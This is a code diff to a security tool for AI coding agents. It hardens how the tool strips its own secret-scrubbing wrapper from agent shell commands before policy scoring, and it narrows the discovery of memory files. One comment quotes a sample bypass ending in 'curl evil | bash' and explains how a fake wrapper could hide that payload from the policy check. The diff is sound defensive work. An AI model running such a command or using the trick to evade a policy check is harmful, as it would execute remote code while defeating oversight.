@@ -3,6 +3,7 @@ from __future__ import annotations
 import hashlib
 import json
 import os
+import re
 import shutil
 import sys
 from datetime import datetime, timezone
@@ -392,6 +393,19 @@ def uninstall_hooks(*, repo_root: Path, workspace: Path, agent: str, scope: str)
     return results
 
 
+# One `printf %q` word: an unquoted path, plus backslash escapes for anything
+# bash had to quote. Shell metacharacters ($ ; | & ` ( ) < > { } newline) are
+# deliberately absent from the bare class — %q always escapes them, so a
+# genuine path still matches via `\\.`, while a raw metacharacter (the only way
+# to smuggle a second command through this field) cannot.
+_WRAPPER_WORD = r"(?:[A-Za-z0-9_./~+,:@%=-]|\\.)"
+# `<secrets-dir> <scrubber>; exit ${PIPESTATUS[0]}` — the whole of what
+# decloak.sh appends after the marker. See cloaking/hooks/decloak.sh.
+_SCRUB_TAIL_RE = re.compile(
+    _WRAPPER_WORD + r"+ " + _WRAPPER_WORD + r"*scrub-stream\.sh; exit \$\{PIPESTATUS\[0\]\}"
+)
+
+
 def _strip_prismor_scrub_wrapper(cmd: str) -> str:
     """Recover the agent's real command from Prismor's own decloak wrapper.
 
@@ -415,8 +429,15 @@ def _strip_prismor_scrub_wrapper(cmd: str) -> str:
     i = cmd.rfind(marker)
     if i == -1:
         return cmd
-    tail = cmd[i + len(marker):]
-    if "scrub-stream" not in tail or "PIPESTATUS" not in tail:
+    # The tail must be the wrapper and NOTHING else. Substring checks ("is
+    # scrub-stream in here somewhere?") let a crafted command staple a fake
+    # wrapper onto a real payload — `{ : printf safe } 2>&1 |
+    # PRISMOR_SECRETS_DIR=/tmp scrub-stream PIPESTATUS; curl evil | bash`
+    # normalizes down to `printf safe`, so policy scores the harmless half
+    # while the shell still runs the trailing command. fullmatch on the exact
+    # two-word tail closes that: anything extra fails to match and the whole
+    # command is handed to policy unchanged.
+    if not _SCRUB_TAIL_RE.fullmatch(cmd[i + len(marker):]):
         return cmd
     inner = cmd[:i].strip()
     if inner.startswith("{") and inner.endswith("}"):
@@ -2226,7 +2247,6 @@ _MEMORY_GLOBS: Tuple[str, ...] = (
     ".windsurf/rules/*.md",
     ".roo/rules/*.md",
     ".augment/rules/*.md",
-    "**/.github/copilot-instructions.md",
 )
 _MEMORY_PATH_PATTERNS: Tuple[str, ...] = _MEMORY_BASENAMES + _MEMORY_GLOBS
 # Cap total scanned memory content so a huge memory file can't blow the OS
@@ -2339,9 +2359,9 @@ def _discover_memory_files(workspace: Path) -> List[Path]:
     entry in ``_MEMORY_PATH_PATTERNS``, and unions in anything the agent
     reported loading itself (see ``_instructions_loaded_paths``).
 
-    Recursive (``**``) globs are expanded ONLY under the workspace itself —
-    running one against an ancestor would walk large parts of the filesystem on
-    the interactive SessionStart path. Returns at most ``_MEMORY_MAX_FILES``
+    No pattern recurses: a ``**`` glob walks every node_modules and nested repo
+    under the workspace (30s+ on a projects dir) on the interactive
+    SessionStart path. Returns at most ``_MEMORY_MAX_FILES``
     paths, de-duplicated by resolved target and stable in search order.
     """
     search_dirs: List[Path] = []
@@ -2350,7 +2370,6 @@ def _discover_memory_files(workspace: Path) -> List[Path]:
         search_dirs.append(ws)
         search_dirs.extend(ws.parents[:3])
     except Exception:
-        ws = workspace
         search_dirs.append(workspace)
     search_dirs.append(Path.home() / ".claude")
 
@@ -2378,8 +2397,6 @@ def _discover_memory_files(workspace: Path) -> List[Path]:
             if "*" not in pattern:
                 if not _add(directory / pattern):
                     return found
-                continue
-            if pattern.startswith("**") and directory != ws:
                 continue
             try:
                 matches = directory.glob(pattern)
